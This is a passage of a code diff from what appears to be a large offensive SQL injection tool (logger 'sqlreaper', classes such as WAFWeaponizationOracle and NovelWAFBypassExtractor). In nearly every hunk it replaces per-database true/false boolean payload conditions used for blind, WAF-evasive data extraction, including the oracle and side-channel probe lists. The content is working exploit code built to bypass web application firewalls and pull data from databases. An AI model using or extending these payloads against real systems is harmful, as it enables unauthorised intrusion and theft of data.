-                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                                                             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                                                             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                                                             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -122368,10 +122368,10 @@ class UniversalScanOrchestrator:
                                                                      getattr(_scanner_ref.config, 'dbms', '') or
                                                                      'PostgreSQL')
                                                     _ibw_pol_true = {
-                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                                                         "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                                                         "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                                                         "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -132522,10 +132522,10 @@ class MultiStrategyExtractor:
         # Test with T=3, 5, 2 using _timed_raw (NO double tampering)
         _sa_dbms = getattr(self, 'dbms', '') or ''
         _sa_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -132541,10 +132541,10 @@ class MultiStrategyExtractor:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(_sa_dbms, "1e0<2e0")
         _sa_false_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -132750,10 +132750,10 @@ class MultiStrategyExtractor:
                         _pe = self._build_inline(_inline_err_expr)
                     _mse_err_ok_dbms = getattr(self, 'dbms', '') or ''
                     _mse_err_ok_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                         "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                         "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                         "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -133012,10 +133012,10 @@ class MultiStrategyExtractor:
                     else self._build_inline(f"(SELECT COUNT(*) FROM {_aliases})>0")))
         _mse_heavy_light_dbms = getattr(self, 'dbms', '') or ''
         _mse_heavy_light_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -133349,10 +133349,10 @@ class MultiStrategyExtractor:
         # Measure actual baseline response time (3 probes)
         _pa_dbms = getattr(self, 'dbms', '') or ''
         _pa_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -133667,10 +133667,10 @@ class MultiStrategyExtractor:
             try:
                 _bbd_dbms = getattr(self, 'dbms', '') or ''
                 _bbd_true_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                     "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                     "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                     "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -133686,10 +133686,10 @@ class MultiStrategyExtractor:
                     "SAP_HANA":        "ABS(-1e0)>(0e0)",
                 }.get(_bbd_dbms, "1e0<2e0")
                 _bbd_false_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                     "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                     "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                     "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -133840,10 +133840,10 @@ class MultiStrategyExtractor:
         #  Validation: confirm with WAF-evasive conditions AND real extraction condition
         _mse_val_dbms = getattr(self, 'dbms', '') or ''
         _mse_val_true = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -133859,10 +133859,10 @@ class MultiStrategyExtractor:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(_mse_val_dbms, "1e0<2e0")
         _mse_val_false = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -134253,10 +134253,10 @@ class MultiStrategyExtractor:
                 "between", "greatest", "numericobfuscate", "charencode"]
         _td_dbms = getattr(self, 'dbms', '') or ''
         _td_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -134355,10 +134355,10 @@ class MultiStrategyExtractor:
             if n > 1:
                 _dcn_dbms = getattr(self, 'dbms', '') or ''
                 _dcn_true = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                     "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                     "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                     "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -134566,10 +134566,10 @@ class MultiStrategyExtractor:
         _oracle_fails = {}  # oracle_name  fail count
 
         _mse_hc_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -135113,10 +135113,10 @@ class MultiStrategyExtractor:
         _eft_space_streak = 0
 
         _eft_hc_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -137897,10 +137897,10 @@ class ExtractionBypassFinder:
 
         _ebf_p1_dbms = self.dbms or ''
         _ebf_p1_true = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":          "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
             "TiDB":           "LEAST(2e0,3e0)>(0e0)",
@@ -137916,10 +137916,10 @@ class ExtractionBypassFinder:
             "ClickHouse":     "least(2e0,3e0)>(0e0)",
         }.get(_ebf_p1_dbms, "1e0<2e0")
         _ebf_p1_false = {
-            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":          "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":        "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":           "GREATEST(2e0,3e0)<(0e0)",
@@ -147135,8 +147135,8 @@ class CacheInferenceOracle:
         false_payload = None
         for t, f in [
             ("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0"),
-            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)"),
             ("LEAST(2e0,3e0)>(0e0)","GREATEST(2e0,3e0)<(0e0)"),
             ("ABS(-1e0)>(0e0)","ABS(-1e0)<(0e0)"),
             ("NVL(NULL,1e0)>(0e0)","NVL(NULL,1e0)<(0e0)"),
@@ -147306,8 +147306,8 @@ class CompressionSideChannel:
         false_payload = None
         for t, f in [
             ("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0"),
-            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)"),
             ("LEAST(2e0,3e0)>(0e0)","GREATEST(2e0,3e0)<(0e0)"),
             ("ABS(-1e0)>(0e0)","ABS(-1e0)<(0e0)"),
             ("NVL(NULL,1e0)>(0e0)","NVL(NULL,1e0)<(0e0)"),
@@ -151411,10 +151411,10 @@ class WAFWeaponizationOracle:
         import asyncio, logging
         _log = logging.getLogger("sqlreaper")
         _ww_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -151430,10 +151430,10 @@ class WAFWeaponizationOracle:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(dbms or '', "1e0<2e0")
         _ww_false_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -151869,10 +151869,10 @@ class NovelWAFBypassExtractor:
                     "CockroachDB":"SELECT current_user"}
 
         _novel_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -151888,10 +151888,10 @@ class NovelWAFBypassExtractor:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(dbms, "1e0<2e0")
         _novel_false_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -153406,10 +153406,10 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             # - If eval_fn(evasive_true) returns None  → WAF blocking all conditions → abort
             # All cases abort extraction, but the log message correctly identifies root cause.
             _bw_san_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                 "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                 "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                 "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -153477,10 +153477,10 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         if _char_sanity_r:
             # Same WAF-limited vs corrupt analysis as the length sanity check above.
             _bw_char_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
